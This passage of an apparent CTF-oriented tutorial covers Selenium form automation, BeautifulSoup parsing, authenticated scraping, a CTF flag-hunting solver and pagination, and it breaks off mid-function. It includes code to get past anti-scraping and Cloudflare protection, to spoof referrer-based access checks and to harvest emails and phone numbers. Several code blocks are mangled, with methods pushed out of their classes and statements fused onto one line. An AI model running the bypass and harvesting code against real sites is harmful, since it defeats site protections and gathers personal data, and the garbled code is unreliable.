        """Extract data from dynamically loaded table"""
        self.wait_for_element_visible(table_selector)
        
        table = self.driver.find_element(By.CSS_SELECTOR, table_selector)
        rows = table.find_elements(By.TAG_NAME, 'tr')
        
        data = []
        for row in rows:
            cells = row.find_elements(By.TAG_NAME, 'td')
            if cells:
                row_data = [cell.text for cell in cells]
                data.append(row_data)
        
        return data

# Usage
from selenium import webdriver
driver = webdriver.Chrome()
handler = DynamicContentHandler(driver)

driver.get('http://target.com/dynamic-page')
handler.wait_for_ajax_complete()
table_data = handler.extract_dynamic_table('#data-table')
print(table_data)
```

### Form Automation & Interaction

**Complex Form Handling:**

```python
#!/usr/bin/env python3
from selenium import webdriver
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

class FormAutomation:
    def __init__(self, driver):
        self.driver = driver
    
    def fill_text_field(self, selector, value):
        """Fill text input field"""
        element = self.driver.find_element(By.CSS_SELECTOR, selector)
        element.clear()
        element.send_keys(value)
    
    def select_dropdown(self, selector, value, by_value=True):
        """Select dropdown option"""
        select_element = Select(self.driver.find_element(By.CSS_SELECTOR, selector))
        
        if by_value:
            select_element.select_by_value(value)
        else:
            select_element.select_by_visible_text(value)
    
    def check_checkbox(self, selector, should_check=True):
        """Check or uncheck checkbox"""
        checkbox = self.driver.find_element(By.CSS_SELECTOR, selector)
        is_checked = checkbox.is_selected()
        
        if should_check and not is_checked:
            checkbox.click()
        elif not should_check and is_checked:
            checkbox.click()
    
    def select_radio(self, selector):
        """Select radio button"""
        radio = self.driver.find_element(By.CSS_SELECTOR, selector)
        if not radio.is_selected():
            radio.click()
    
    def upload_file(self, selector, file_path):
        """Upload file"""
        file_input = self.driver.find_element(By.CSS_SELECTOR, selector)
        file_input.send_keys(file_path)
    
    def submit_form(self, form_selector):
        """Submit form"""
        form = self.driver.find_element(By.CSS_SELECTOR, form_selector)
        form.submit()
    
    def handle_alert(self, accept=True):
        """Handle JavaScript alert"""
        try:
            alert = self.driver.switch_to.alert
            alert_text = alert.text
            
            if accept:
                alert.accept()
            else:
                alert.dismiss()
            
            return alert_text
        except:
            return None
    
    def fill_complex_form(self, form_data):
        """Fill complex form with multiple field types"""
        for field_name, field_info in form_data.items():
            field_type = field_info['type']
            selector = field_info['selector']
            value = field_info['value']
            
            if field_type == 'text':
                self.fill_text_field(selector, value)
            elif field_type == 'dropdown':
                self.select_dropdown(selector, value)
            elif field_type == 'checkbox':
                self.check_checkbox(selector, value)
            elif field_type == 'radio':
                if value:
                    self.select_radio(selector)
            elif field_type == 'file':
                self.upload_file(selector, value)
            
            time.sleep(0.2)  # Small delay between fields

# Usage example
driver = webdriver.Chrome()
form_auto = FormAutomation(driver)

driver.get('http://target.com/form')

form_data = {
    'username': {'type': 'text', 'selector': '#username', 'value': 'testuser'},
    'email': {'type': 'text', 'selector': '#email', 'value': 'test@test.com'},
    'country': {'type': 'dropdown', 'selector': '#country', 'value': 'US'},
    'terms': {'type': 'checkbox', 'selector': '#terms', 'value': True},
    'gender': {'type': 'radio', 'selector': '#gender-male', 'value': True},
}

form_auto.fill_complex_form(form_data)
form_auto.submit_form('#registration-form')
```

### Advanced Selenium Techniques

**Multi-Tab/Window Handling:**

```python
#!/usr/bin/env python3

class MultiWindowHandler:
    def __init__(self, driver):
        self.driver = driver
        self.main_window = driver.current_window_handle
    
    def open_new_tab(self, url):
        """Open URL in new tab"""
        self.driver.execute_script(f"window.open('{url}', '_blank');")
        
        # Switch to new tab
        self.driver.switch_to.window(self.driver.window_handles[-1])
    
    def switch_to_tab(self, index):
        """Switch to tab by index"""
        windows = self.driver.window_handles
        if index < len(windows):
            self.driver.switch_to.window(windows[index])
    
    def close_current_tab(self):
        """Close current tab and switch to main"""
        self.driver.close()
        self.driver.switch_to.window(self.main_window)
    
    def handle_popup(self):
        """Handle popup window"""
        main_window = self.driver.current_window_handle
        
        for window in self.driver.window_handles:
            if window != main_window:
                self.driver.switch_to.window(window)
                # Do something in popup
                popup_content = self.driver.page_source
                self.driver.close()
                break
        
        # Switch back to main
        self.driver.switch_to.window(main_window)
        return popup_content

# iframe handling
def switch_to_iframe(driver, iframe_selector):
    """Switch to iframe"""
    iframe = driver.find_element(By.CSS_SELECTOR, iframe_selector)
    driver.switch_to.frame(iframe)

def switch_to_default_content(driver):
    """Switch back to main content"""
    driver.switch_to.default_content()
```

**Screenshot & Visual Testing:**

```python
#!/usr/bin/env python3
from PIL import Image
import io

class VisualTesting:
    def __init__(self, driver):
        self.driver = driver
    
    def screenshot_element(self, selector, filename):
        """Screenshot specific element"""
        element = self.driver.find_element(By.CSS_SELECTOR, selector)
        element.screenshot(filename)
    
    def full_page_screenshot(self, filename):
        """Take full page screenshot"""
        # Get page dimensions
        total_height = self.driver.execute_script("return document.body.scrollHeight")
        viewport_height = self.driver.execute_script("return window.innerHeight")
        
        # Set window size to full page
        self.driver.set_window_size(1920, total_height)
        
        # Take screenshot
        self.driver.save_screenshot(filename)
    
    def compare_screenshots(self, img1_path, img2_path):
        """Compare two screenshots for differences"""
        from PIL import ImageChops
        
        img1 = Image.open(img1_path)
        img2 = Image.open(img2_path)
        
        diff = ImageChops.difference(img1, img2)
        
        if diff.getbbox():
            print("[!] Screenshots differ")
            diff.save('difference.png')
            return False
        else:
            print("[+] Screenshots identical")
            return True
```

---

## Beautiful Soup and Requests Library

Beautiful Soup excels at parsing static HTML content and extracting structured data from web pages.

### Basic Beautiful Soup Usage

**HTML Parsing & Navigation:**

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import re

class HTMLParser:
    def __init__(self, url=None, html=None):
        if url:
            response = requests.get(url)
            self.soup = BeautifulSoup(response.content, 'html.parser')
        elif html:
            self.soup = BeautifulSoup(html, 'html.parser') else: raise ValueError("Must provide either URL or HTML content")

def find_by_tag(self, tag, limit=None):
    """Find all elements by tag name"""
    if limit:
        return self.soup.find_all(tag, limit=limit)
    return self.soup.find_all(tag)

def find_by_class(self, class_name):
    """Find elements by class name"""
    return self.soup.find_all(class_=class_name)

def find_by_id(self, element_id):
    """Find element by ID"""
    return self.soup.find(id=element_id)

def find_by_attribute(self, tag, attribute, value):
    """Find elements by attribute value"""
    return self.soup.find_all(tag, {attribute: value})

def find_by_text(self, text, partial=False):
    """Find elements containing specific text"""
    if partial:
        return self.soup.find_all(text=re.compile(text, re.IGNORECASE))
    return self.soup.find_all(text=text)

def extract_links(self):
    """Extract all links from page"""
    links = []
    for link in self.soup.find_all('a', href=True):
        links.append({
            'url': link['href'],
            'text': link.get_text(strip=True)
        })
    return links

def extract_images(self):
    """Extract all image URLs"""
    images = []
    for img in self.soup.find_all('img', src=True):
        images.append({
            'src': img['src'],
            'alt': img.get('alt', ''),
            'title': img.get('title', '')
        })
    return images

def extract_forms(self):
    """Extract all forms and their fields"""
    forms = []
    for form in self.soup.find_all('form'):
        form_data = {
            'action': form.get('action'),
            'method': form.get('method', 'GET').upper(),
            'fields': []
        }
        
        # Extract input fields
        for input_field in form.find_all(['input', 'textarea', 'select']):
            field_info = {
                'type': input_field.get('type', input_field.name),
                'name': input_field.get('name'),
                'value': input_field.get('value', ''),
                'required': input_field.has_attr('required')
            }
            form_data['fields'].append(field_info)
        
        forms.append(form_data)
    
    return forms

def extract_tables(self):
    """Extract data from all tables"""
    tables = []
    for table in self.soup.find_all('table'):
        table_data = []
        
        # Extract headers
        headers = []
        header_row = table.find('thead')
        if header_row:
            headers = [th.get_text(strip=True) for th in header_row.find_all('th')]
        
        # Extract rows
        for row in table.find_all('tr'):
            cells = row.find_all(['td', 'th'])
            if cells:
                row_data = [cell.get_text(strip=True) for cell in cells]
                table_data.append(row_data)
        
        tables.append({
            'headers': headers,
            'data': table_data
        })
    
    return tables

def extract_metadata(self):
    """Extract meta tags"""
    metadata = {}
    for meta in self.soup.find_all('meta'):
        name = meta.get('name') or meta.get('property')
        content = meta.get('content')
        if name and content:
            metadata[name] = content
    
    return metadata

def extract_scripts(self):
    """Extract JavaScript code"""
    scripts = []
    for script in self.soup.find_all('script'):
        if script.string:
            scripts.append(script.string)
    return scripts

def extract_comments(self):
    """Extract HTML comments"""
    from bs4 import Comment
    comments = self.soup.find_all(string=lambda text: isinstance(text, Comment))
    return [str(comment).strip() for comment in comments]

# Usage example

parser = HTMLParser(url='http://target.com')

# Extract various elements

links = parser.extract_links() print(f"[*] Found {len(links)} links")

forms = parser.extract_forms() print(f"[*] Found {len(forms)} forms")

tables = parser.extract_tables() print(f"[*] Found {len(tables)} tables")

comments = parser.extract_comments() print(f"[*] Found {len(comments)} HTML comments")
````

### Advanced Scraping Techniques

**CSS Selector & XPath:**
```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
from lxml import etree

class AdvancedScraper:
    def __init__(self, url):
        self.url = url
        response = requests.get(url)
        self.soup = BeautifulSoup(response.content, 'html.parser')
        self.tree = etree.HTML(response.content)
    
    def select_css(self, selector):
        """Use CSS selectors (more flexible than find_all)"""
        return self.soup.select(selector)
    
    def select_xpath(self, xpath):
        """Use XPath expressions"""
        return self.tree.xpath(xpath)
    
    def extract_nested_data(self, container_selector, item_selectors):
        """Extract nested data structure"""
        containers = self.soup.select(container_selector)
        results = []
        
        for container in containers:
            item_data = {}
            for key, selector in item_selectors.items():
                element = container.select_one(selector)
                if element:
                    item_data[key] = element.get_text(strip=True)
            results.append(item_data)
        
        return results
    
    def extract_with_context(self, pattern):
        """Extract data with surrounding context"""
        results = []
        
        # Find all text matching pattern
        matches = self.soup.find_all(text=re.compile(pattern))
        
        for match in matches:
            parent = match.parent
            results.append({
                'text': match.strip(),
                'parent_tag': parent.name,
                'parent_class': parent.get('class', []),
                'context': parent.get_text(strip=True)
            })
        
        return results

# Usage examples
scraper = AdvancedScraper('http://target.com')

# CSS Selector examples
# Select all divs with specific class
divs = scraper.select_css('div.card')

# Select elements with multiple conditions
elements = scraper.select_css('div.card > h2.title')

# Select by attribute
links = scraper.select_css('a[href*="admin"]')

# XPath examples
# Select all table rows
rows = scraper.select_xpath('//table//tr')

# Select elements with specific text
elements = scraper.select_xpath('//*[contains(text(), "password")]')

# Complex nested extraction
products = scraper.extract_nested_data(
    'div.product-card',
    {
        'name': 'h3.product-name',
        'price': 'span.price',
        'description': 'p.description'
    }
)
````

### Web Scraping with Authentication

**Session Management & Cookies:**

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import pickle

class AuthenticatedScraper:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        
        # Set headers to mimic browser
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
    
    def login(self, username, password, login_url=None):
        """Perform login and maintain session"""
        if not login_url:
            login_url = f"{self.base_url}/login"
        
        # Get login page to extract CSRF token
        response = self.session.get(login_url)
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Extract CSRF token
        csrf_token = None
        csrf_input = soup.find('input', {'name': re.compile(r'csrf|token', re.I)})
        if csrf_input:
            csrf_token = csrf_input.get('value')
        
        # Prepare login data
        login_data = {
            'username': username,
            'password': password
        }
        
        if csrf_token:
            login_data['csrf_token'] = csrf_token
        
        # Submit login
        response = self.session.post(login_url, data=login_data)
        
        # Verify login success
        if response.status_code == 200:
            if 'logout' in response.text.lower() or 'dashboard' in response.text.lower():
                print("[+] Login successful")
                return True
        
        print("[-] Login failed")
        return False
    
    def save_session(self, filename='session.pkl'):
        """Save session cookies to file"""
        with open(filename, 'wb') as f:
            pickle.dump(self.session.cookies, f)
        print(f"[+] Session saved to {filename}")
    
    def load_session(self, filename='session.pkl'):
        """Load session cookies from file"""
        try:
            with open(filename, 'rb') as f:
                self.session.cookies.update(pickle.load(f))
            print(f"[+] Session loaded from {filename}")
            return True
        except FileNotFoundError:
            print(f"[-] Session file not found: {filename}")
            return False
    
    def scrape_authenticated_page(self, path):
        """Scrape page requiring authentication"""
        url = f"{self.base_url}{path}"
        response = self.session.get(url)
        
        if response.status_code == 200:
            return BeautifulSoup(response.content, 'html.parser')
        else:
            print(f"[-] Failed to access {url}: {response.status_code}")
            return None
    
    def extract_user_data(self, profile_path='/profile'):
        """Extract data from authenticated user profile"""
        soup = self.scrape_authenticated_page(profile_path)
        
        if not soup:
            return None
        
        user_data = {
            'username': None,
            'email': None,
            'role': None,
            'additional_info': {}
        }
        
        # Extract common fields (adjust selectors for target site)
        username_elem = soup.select_one('.username, #username, [data-username]')
        if username_elem:
            user_data['username'] = username_elem.get_text(strip=True)
        
        email_elem = soup.select_one('.email, #email, [data-email]')
        if email_elem:
            user_data['email'] = email_elem.get_text(strip=True)
        
        return user_data

# Usage
scraper = AuthenticatedScraper('http://target.com')

# Try to load existing session
if not scraper.load_session():
    # Login if no saved session
    scraper.login('admin', 'password123')
    scraper.save_session()

# Scrape authenticated pages
profile_data = scraper.extract_user_data()
print(f"[*] Profile data: {profile_data}")
```

### Rate Limiting & Polite Scraping

**Throttling & Retry Logic:**

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import time
from functools import wraps
import random

class PoliteScraper:
    def __init__(self, base_url, delay_range=(1, 3), max_retries=3):
        self.base_url = base_url
        self.delay_range = delay_range
        self.max_retries = max_retries
        self.session = requests.Session()
        self.request_count = 0
    
    def throttle(func):
        """Decorator to add delay between requests"""
        @wraps(func)
        def wrapper(self, *args, **kwargs):
            if self.request_count > 0:
                delay = random.uniform(*self.delay_range)
                print(f"[*] Waiting {delay:.2f}s before next request...")
                time.sleep(delay)
            
            self.request_count += 1
            return func(self, *args, **kwargs)
        return wrapper
    
    @throttle
    def fetch_page(self, url, method='GET', **kwargs):
        """Fetch page with retry logic"""
        for attempt in range(self.max_retries):
            try:
                if method.upper() == 'GET':
                    response = self.session.get(url, timeout=10, **kwargs)
                else:
                    response = self.session.post(url, timeout=10, **kwargs)
                
                # Handle rate limiting
                if response.status_code == 429:
                    retry_after = int(response.headers.get('Retry-After', 60))
                    print(f"[!] Rate limited. Waiting {retry_after}s...")
                    time.sleep(retry_after)
                    continue
                
                response.raise_for_status()
                return response
            
            except requests.exceptions.RequestException as e:
                print(f"[-] Attempt {attempt + 1} failed: {e}")
                if attempt < self.max_retries - 1:
                    wait_time = 2 ** attempt  # Exponential backoff
                    time.sleep(wait_time)
                else:
                    print(f"[-] Max retries reached for {url}")
                    return None
        
        return None
    
    def scrape_multiple_pages(self, url_list):
        """Scrape multiple pages with throttling"""
        results = []
        
        for i, url in enumerate(url_list):
            print(f"[*] Scraping page {i+1}/{len(url_list)}: {url}")
            response = self.fetch_page(url)
            
            if response:
                soup = BeautifulSoup(response.content, 'html.parser')
                results.append({
                    'url': url,
                    'title': soup.title.string if soup.title else None,
                    'content': soup.get_text(strip=True)[:500]  # First 500 chars
                })
        
        return results
    
    def respect_robots_txt(self, path='/robots.txt'):
        """Check robots.txt for scraping rules"""
        robots_url = f"{self.base_url}{path}"
        response = self.fetch_page(robots_url)
        
        if response:
            print("[*] robots.txt content:")
            print(response.text)
            
            # Parse disallowed paths
            disallowed = []
            for line in response.text.split('\n'):
                if line.lower().startswith('disallow:'):
                    path = line.split(':', 1)[1].strip()
                    disallowed.append(path)
            
            return disallowed
        
        return []

# Usage
scraper = PoliteScraper('http://target.com', delay_range=(2, 5))

# Check robots.txt
disallowed_paths = scraper.respect_robots_txt()
print(f"[*] Disallowed paths: {disallowed_paths}")

# Scrape multiple pages with automatic throttling
urls = [f'http://target.com/page{i}' for i in range(1, 11)]
results = scraper.scrape_multiple_pages(urls)
```

### Data Extraction & Processing

**Structured Data Extraction:**

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import json
import csv
import re

class DataExtractor:
    def __init__(self, html_content=None, url=None):
        if url:
            response = requests.get(url)
            self.soup = BeautifulSoup(response.content, 'html.parser')
        elif html_content:
            self.soup = BeautifulSoup(html_content, 'html.parser')
    
    def extract_structured_data(self, config):
        """
        Extract data based on configuration
        
        config = {
            'container': 'div.product',
            'fields': {
                'name': {'selector': 'h2.name', 'attribute': None},
                'price': {'selector': 'span.price', 'attribute': None},
                'image': {'selector': 'img', 'attribute': 'src'}
            }
        }
        """
        results = []
        containers = self.soup.select(config['container'])
        
        for container in containers:
            item = {}
            
            for field_name, field_config in config['fields'].items():
                element = container.select_one(field_config['selector'])
                
                if element:
                    if field_config.get('attribute'):
                        value = element.get(field_config['attribute'])
                    else:
                        value = element.get_text(strip=True)
                    
                    # Apply transformations if specified
                    if 'transform' in field_config:
                        value = field_config['transform'](value)
                    
                    item[field_name] = value
            
            if item:  # Only add if we extracted some data
                results.append(item)
        
        return results
    
    def extract_json_ld(self):
        """Extract JSON-LD structured data"""
        json_ld_data = []
        
        for script in self.soup.find_all('script', type='application/ld+json'):
            try:
                data = json.loads(script.string)
                json_ld_data.append(data)
            except json.JSONDecodeError:
                continue
        
        return json_ld_data
    
    def extract_microdata(self):
        """Extract Microdata structured data"""
        items = []
        
        for item in self.soup.find_all(attrs={'itemscope': True}):
            item_type = item.get('itemtype')
            properties = {}
            
            for prop in item.find_all(attrs={'itemprop': True}):
                prop_name = prop.get('itemprop')
                
                # Get property value
                if prop.name == 'meta':
                    prop_value = prop.get('content')
                elif prop.name == 'link':
                    prop_value = prop.get('href')
                else:
                    prop_value = prop.get_text(strip=True)
                
                properties[prop_name] = prop_value
            
            items.append({
                'type': item_type,
                'properties': properties
            })
        
        return items
    
    def clean_text(self, text):
        """Clean extracted text"""
        # Remove extra whitespace
        text = re.sub(r'\s+', ' ', text)
        
        # Remove special characters if needed
        # text = re.sub(r'[^\w\s]', '', text)
        
        return text.strip()
    
    def extract_emails(self):
        """Extract email addresses from page"""
        text = self.soup.get_text()
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        emails = re.findall(email_pattern, text)
        return list(set(emails))  # Remove duplicates
    
    def extract_phone_numbers(self):
        """Extract phone numbers from page"""
        text = self.soup.get_text()
        
        # Various phone number patterns
        patterns = [
            r'\+?\d{1,3}[-.\s]?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}',  # US/International
            r'\d{3}-\d{3}-\d{4}',  # XXX-XXX-XXXX
            r'\(\d{3}\)\s?\d{3}-\d{4}',  # (XXX) XXX-XXXX
        ]
        
        phones = []
        for pattern in patterns:
            phones.extend(re.findall(pattern, text))
        
        return list(set(phones))
    
    def save_to_json(self, data, filename):
        """Save extracted data to JSON"""
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        print(f"[+] Data saved to {filename}")
    
    def save_to_csv(self, data, filename):
        """Save extracted data to CSV"""
        if not data:
            print("[-] No data to save")
            return
        
        keys = data[0].keys()
        
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=keys)
            writer.writeheader()
            writer.writerows(data)
        
        print(f"[+] Data saved to {filename}")

# Usage example
extractor = DataExtractor(url='http://target.com/products')

# Define extraction configuration
config = {
    'container': 'div.product-card',
    'fields': {
        'name': {
            'selector': 'h3.product-name',
            'attribute': None
        },
        'price': {
            'selector': 'span.price',
            'attribute': None,
            'transform': lambda x: float(x.replace('$', '').replace(',', ''))
        },
        'image': {
            'selector': 'img.product-image',
            'attribute': 'src'
        },
        'link': {
            'selector': 'a.product-link',
            'attribute': 'href'
        }
    }
}

# Extract data
products = extractor.extract_structured_data(config)
print(f"[*] Extracted {len(products)} products")

# Save results
extractor.save_to_json(products, 'products.json')
extractor.save_to_csv(products, 'products.csv')

# Extract contact information
emails = extractor.extract_emails()
phones = extractor.extract_phone_numbers()
print(f"[*] Found {len(emails)} emails: {emails}")
print(f"[*] Found {len(phones)} phone numbers: {phones}")
```

### Handling Anti-Scraping Measures

**Bypass Common Protections:**

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import time
import random
from urllib.parse import urljoin

class AntiScrapingBypass:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.setup_session()
    
    def setup_session(self):
        """Configure session to appear more like a real browser"""
        # Rotate user agents
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        ]
        
        self.session.headers.update({
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Referer': self.base_url
        })
    
    def handle_cloudflare(self, url):
        """
        Handle Cloudflare protection
        [Inference] May require cloudscraper library for full bypass
        """
        try:
            import cloudscraper
            scraper = cloudscraper.create_scraper()
            response = scraper.get(url)
            return response
        except ImportError:
            print("[-] cloudscraper not installed. Install with: pip install cloudscraper")
            return None
    
    def handle_javascript_challenge(self, url):
        """Use Selenium for JavaScript challenges"""
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        
        options = Options()
        options.add_argument('--headless')
        driver = webdriver.Chrome(options=options)
        
        driver.get(url)
        time.sleep(5)  # Wait for JS to execute
        
        page_source = driver.page_source
        driver.quit()
        
        return page_source
    
    def handle_honeypot_links(self, soup):
        """Detect and avoid honeypot links"""
        # Honeypot links often have:
        # - display:none CSS
        # - Hidden in comments
        # - robots.txt violations
        
        visible_links = []
        
        for link in soup.find_all('a', href=True):
            # Check if link is visible
            style = link.get('style', '')
            if 'display:none' in style or 'display: none' in style:
                continue
            
            # Check parent visibility
            parent = link.parent
            if parent and parent.get('style'):
                parent_style = parent.get('style', '')
                if 'display:none' in parent_style:
                    continue
            
            visible_links.append(link['href'])
        
        return visible_links
    
    def randomize_request_timing(self):
        """Add random delay to mimic human behavior"""
        # Human-like delays
        delay = random.gauss(3, 1)  # Mean 3s, std dev 1s
        delay = max(1, min(delay, 7))  # Clamp between 1-7 seconds
        time.sleep(delay)
    
    def handle_session_cookies(self, url):
        """Properly handle session cookies"""
        # First, visit main page to get session cookie
        self.session.get(self.base_url)
        time.sleep(1)
        
        # Then access target page
        response = self.session.get(url)
        return response
    
    def bypass_referrer_check(self, target_url, referrer=None):
        """Bypass referrer-based access control"""
        if not referrer:
            referrer = self.base_url
        
        headers = {'Referer': referrer}
        response = self.session.get(target_url, headers=headers)
        return response

# Usage
bypass = AntiScrapingBypass('http://target.com')

# Try different bypass techniques
url = 'http://target.com/protected-page'

# Method 1: Standard with proper headers
response = bypass.handle_session_cookies(url)

# Method 2: For Cloudflare protected sites
# response = bypass.handle_cloudflare(url)

# Method 3: For heavy JavaScript sites
# html = bypass.handle_javascript_challenge(url)
```

### Complete CTF Scraping Example

**Full CTF Challenge Solver:**

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import re
import time

class CTFScrapingSolver:
    """
    Example: Solve CTF challenge requiring multi-step scraping
    """
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.flags = []
    
    def solve_challenge(self):
        """
        Example challenge:
        1. Login to get session
        2. Navigate through multiple pages
        3. Extract hidden flags
        4. Solve puzzle based on extracted data
        """
        print("[*] Starting CTF challenge solver...")
        
        # Step 1: Login
        if not self.login():
            print("[-] Login failed")
            return
        
        # Step 2: Discover pages
        pages = self.discover_pages()
        print(f"[*] Discovered {len(pages)} pages")
        
        # Step 3: Extract flags from each page
        for page in pages:
            flags = self.extract_flags_from_page(page)
            self.flags.extend(flags)
        
        print(f"[+] Found {len(self.flags)} flags")
        
        # Step 4: Process flags
        final_flag = self.process_flags(self.flags)
        print(f"[+] Final flag: {final_flag}")
        
        return final_flag
    
    def login(self):
        """Login to CTF platform"""
        login_url = f"{self.base_url}/login"
        response = self.session.get(login_url)
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Extract CSRF token
        csrf = soup.find('input', {'name': 'csrf_token'})
        csrf_value = csrf['value'] if csrf else None
        
        # Submit login
        data = {
            'username': 'player',
            'password': 'ctf2024',
            'csrf_token': csrf_value
        }
        
        response = self.session.post(login_url, data=data)
        return 'dashboard' in response.text
    
    def discover_pages(self):
        """Discover all accessible pages"""
        dashboard_url = f"{self.base_url}/dashboard"
        response = self.session.get(dashboard_url)
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Extract all internal links
        pages = set()
        for link in soup.find_all('a', href=True):
            href = link['href']
            if href.startswith('/'):
                pages.add(href)
        
        # Also check HTML comments for hidden pages
        from bs4 import Comment
        comments = soup.find_all(string=lambda text: isinstance(text, Comment))
        for comment in comments:
            # Look for URLs in comments
            urls = re.findall(r'/[a-zA-Z0-9_/-]+', str(comment))
            pages.update(urls)
        
        return list(pages)
    
    def extract_flags_from_page(self, page_path):
        """Extract flags from specific page"""
        url = f"{self.base_url}{page_path}"
        response = self.session.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')

    flags = []
    
    # Method 1: Direct flag pattern matching
    flag_pattern = r'CTF\{[^}]+\}|FLAG\{[^}]+\}|flag\{[^}]+\}'
    text_flags = re.findall(flag_pattern, response.text, re.IGNORECASE)
    flags.extend(text_flags)
    
    # Method 2: Hidden in HTML comments
    from bs4 import Comment
    comments = soup.find_all(string=lambda text: isinstance(text, Comment))
    for comment in comments:
        comment_flags = re.findall(flag_pattern, str(comment), re.IGNORECASE)
        flags.extend(comment_flags)
    
    # Method 3: Base64 encoded flags
    import base64
    base64_pattern = r'[A-Za-z0-9+/]{20,}={0,2}'
    potential_b64 = re.findall(base64_pattern, response.text)
    for encoded in potential_b64:
        try:
            decoded = base64.b64decode(encoded).decode('utf-8', errors='ignore')
            if re.search(flag_pattern, decoded, re.IGNORECASE):
                flags.append(decoded)
        except:
            pass
    
    # Method 4: Hidden in meta tags
    meta_tags = soup.find_all('meta')
    for meta in meta_tags:
        content = meta.get('content', '')
        meta_flags = re.findall(flag_pattern, content, re.IGNORECASE)
        flags.extend(meta_flags)
    
    # Method 5: Hidden in JavaScript
    scripts = soup.find_all('script')
    for script in scripts:
        if script.string:
            js_flags = re.findall(flag_pattern, script.string, re.IGNORECASE)
            flags.extend(js_flags)
    
    # Method 6: Hidden in CSS (unusual but possible)
    styles = soup.find_all('style')
    for style in styles:
        if style.string:
            css_flags = re.findall(flag_pattern, style.string, re.IGNORECASE)
            flags.extend(css_flags)
    
    # Method 7: Data attributes
    elements_with_data = soup.find_all(attrs={'data-flag': True})
    for elem in elements_with_data:
        flags.append(elem['data-flag'])
    
    if flags:
        print(f"[+] Found {len(flags)} flag(s) in {page_path}")
    
    return list(set(flags))  # Remove duplicates

def process_flags(self, flags):
    """Process extracted flags to get final answer"""
    # Example: Flags might need to be combined/decoded
    
    # Remove duplicates
    unique_flags = list(set(flags))
    
    # Sort alphabetically
    unique_flags.sort()
    
    # Combine if multiple parts
    if len(unique_flags) > 1:
        # Check if flags are numbered parts
        parts = {}
        for flag in unique_flags:
            match = re.search(r'part(\d+)', flag, re.IGNORECASE)
            if match:
                part_num = int(match.group(1))
                parts[part_num] = flag
        
        if parts:
            # Reconstruct from parts
            sorted_parts = [parts[i] for i in sorted(parts.keys())]
            final = ''.join(sorted_parts)
            return final
    
    # Return first flag if only one
    return unique_flags[0] if unique_flags else None

# Usage

solver = CTFScrapingSolver('http://ctf.target.com') final_flag = solver.solve_challenge() print(f"\n[_] Challenge solved!") print(f"[_] Submit flag: {final_flag}")
````

### Pagination Handling

**Automated Pagination Scraping:**
```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import time

class PaginationScraper:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.visited_pages = set()
    
    def scrape_all_pages_numbered(self, start_url, max_pages=None):
        """
        Handle numbered pagination (page=1, page=2, etc.)
        """
        all_data = []
        page_num = 1
        
        while True:
            if max_pages and page_num > max_pages:
                break
            
            # Construct page URL
            if '?' in start_url:
                page_url = f"{start_url}&page={page_num}"
            else:
                page_url = f"{start_url}?page={page_num}"
            
            print(f"[*] Scraping page {page_num}: {page_url}")
            
            response = self.session.get(page_url)
            
            if response.status_code != 200:
                print(f"[-] Failed to fetch page {page_num}")
                break
            
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Extract data from page
            page_data = self.extract_data_from_page(soup)
            
            if not page_data:
                print(f"[*] No more data found. Stopping at page {page_num}")
                break
            
            all_data.extend(page_data)
            page_num += 1
            
            time.sleep(1)  # Be polite
        
        return all_data
    
    def scrape_all_pages_next_link(self, start_url, next_selector='a.next'):
        """
        Handle pagination with "Next" link
        """
        all_data = []
        current_url = start_url
        page_num = 1
        
        while current_url:
            if current_url in self.visited_pages:
                print("[*] Detected pagination loop. Stopping.")
                break
            
            self.visited_pages.add(current_url)
            
            print(f"[*] Scraping page {page_num}: {current_url}")
            
            response = self.session.get(current_url)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Extract data
            page_data = self.extract_data_from_page(soup)
            all_data.extend(page_data)
            
            # Find next page link
            next_link = soup.select_one(next_selector)
            
